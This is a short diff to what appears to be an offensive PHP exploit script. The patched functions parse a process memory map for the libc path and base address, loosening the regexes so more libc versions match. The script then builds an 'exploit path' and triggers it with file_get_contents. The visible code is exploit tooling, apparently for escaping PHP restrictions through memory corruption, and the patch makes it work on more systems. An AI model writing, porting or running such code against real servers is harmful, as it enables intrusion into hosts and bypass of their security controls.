@@ -288,7 +288,7 @@ function get_regions($maps_path) {
     return $regions;
 }
 function get_libc_path($maps_path) {
-    preg_match("/\/lib[\w\-\/]+\/libc\-[0-9\.]+.so/", file_get_contents($maps_path), $libc);
+    preg_match("/[\w\-\/]lib[\w\-\/]+\/(libc\-[0-9\.]+.so|libc.so.6)/", file_get_contents($maps_path), $libc);
     if (empty($libc)) {
         echo "[-]can't find libc"."<br>\n";
     } else {
@@ -298,7 +298,7 @@ function get_libc_path($maps_path) {
 }
 
 function get_libc_base($maps_path) {
-    preg_match('/(\w+)-(\w+).*?libc-/', file_get_contents($maps_path), $libcgain);
+    preg_match('/(\w+)-(\w+).*?libc/', file_get_contents($maps_path), $libcgain);
     if (empty($libcgain)) {
         echo "[-]can't find Libc base"."<br>\n";
         return null;
@@ -697,12 +697,3 @@ echo "[+]build_exploit_path: <br>\n".$path."<br>\n";
 if ($run) {
     file_get_contents($path);
 }
-
-
-
-
-
-
-
-
-
